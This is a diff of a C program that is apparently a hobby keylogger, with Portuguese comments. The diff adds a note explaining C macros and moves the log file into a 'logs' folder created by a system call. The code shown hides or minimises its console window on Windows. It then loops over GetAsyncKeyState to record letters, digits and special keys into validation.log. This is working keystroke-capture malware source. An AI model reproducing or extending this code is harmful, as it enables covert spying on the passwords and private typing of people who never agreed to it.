@@ -34,6 +34,26 @@ log_error(const char *fmt, ...);
 log_fatal(const char *fmt, ...);
 */
 
+/*
+Macros sao recursos de pre-processamento, que permite criar estruturas
+para serem substituidas antes do codigo ser devidamente compilado.
+
+Em C++ as Macros nao sao bem vista, pos nao oferecem seguranca de tipos, nao
+respeitam escopo e podem dificultar o entendimento de um escopo do codigo.
+
+Analisando de uma forma mais simples, Macros sao basicamente substituicoes de
+strings. Macros sao tratadas (expandidas) pelo pre-processador e criadas 
+atraves da diretiva #define.
+
+Macros sao de dois principais tipos:
+
+* Objeto: Normalmente utilizado para dar nome a constantes.
+* Funcao: Define uma função inline.
+
+Declarar funcoes simples atraves de Macros podem otimizar o tempo de 
+processamento, ja que evita o custo da chamada de uma funcao.
+*/
+
 // =============================================================================
 // CALL FUNCTIONS
 // =============================================================================
@@ -55,10 +75,16 @@ int main(int argc, char const *argv[]){
   set_portuguese();
   cabecalho();
 
+  char dir[100] = "logs\\";
+
   char *file_name = "validation.log";
 
-  FILE *file_pointer = check_file_exist(file_name);
-  file_pointer = fopen(file_name, "a+");
+  strcat(dir, file_name);
+
+  system("mkdir logs");
+
+  FILE *file_pointer = check_file_exist(dir);
+  file_pointer = fopen(dir, "a+");
 
   if(!file_pointer){
     perror("Error while opening the file.\n");
@@ -66,16 +92,23 @@ int main(int argc, char const *argv[]){
   }
 
   #if defined(_WIN32) || defined(_WIN64) || defined(__CYGWIN__) && !defined(_WIN32)
-    #include <windows.h>
     log_info("We are in a Windows System.");
+
     HWND loggerWindow = GetConsoleWindow();
+
     if(IS_WINDOWS_VISIBLE){
       ShowWindow(loggerWindow, SW_MINIMIZE);
     } else{
       ShowWindow(loggerWindow, SW_HIDE);
     }
+
+    log_info("Sleeping 150...");
+
     Sleep(150);
-    while(1){
+
+    log_info("Looping...");
+
+    while(true){
 			// Letters loop ("A"=65, "Z"=90)	
 			for(char i=65; i<91; i++){
 				if(GetAsyncKeyState(i)){
@@ -86,12 +119,14 @@ int main(int argc, char const *argv[]){
 					}
 				}
 			}
+
 			// Numbers loops ("0"=48, "9"=57)
 			for(char i=48; i<57; i++){
 				if(GetAsyncKeyState(i)){
 					fputc(i, file_pointer);
 				}
 			}
+
 			// Special inputs
 			if(GetAsyncKeyState(VK_RETURN)){
 				fputs("[ENTER]\n", file_pointer);
@@ -107,7 +142,8 @@ int main(int argc, char const *argv[]){
 			}
 			fflush(file_pointer);
 			Sleep(100);
-		}	
+		}
+    
   #elif defined(__linux__)
     log_info("We are in a Linux System.");
     #define IS_ROOT() (geteuid() == 0) ? true : false
